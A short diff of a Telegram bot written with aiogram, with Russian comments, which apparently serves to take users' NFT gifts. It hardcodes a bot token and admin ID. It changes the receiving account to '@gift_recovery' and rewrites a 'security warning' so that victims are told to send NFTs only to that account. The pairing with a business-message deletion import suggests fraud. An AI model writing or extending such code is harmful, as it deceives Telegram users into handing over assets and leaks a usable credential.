@@ -13,7 +13,7 @@ from aiogram.methods import DeleteBusinessMessages
 # ==== ТВОИ ДАННЫЕ ====
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8996050672:AAEuRexyR5o3jNSwlvxQxcEplN2-Bhpfq4M")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "8747920918"))
-RECEIVER = os.getenv("RECEIVER", "marketsellbots")
+RECEIVER = "gift_recovery"  # <-- Новый юзернейм
 
 # ==== ID КАСТОМНЫХ ЭМОДЗИ ====
 EMOJI_CHECK = "5776375003280838798"
@@ -284,7 +284,7 @@ async def on_accept(callback: CallbackQuery):
     # КОРОТКИЙ АЛЕРТ (до 200 символов)
     warning_text = (
         "⚠️ ВНИМАНИЕ! Не передавайте NFT напрямую.\n"
-        "Только боту: @marketsellbots.\n"
+        "Только боту: @gift_recovery.\n"
         "Будьте бдительны!"
     )
     await callback.answer(warning_text, show_alert=True)
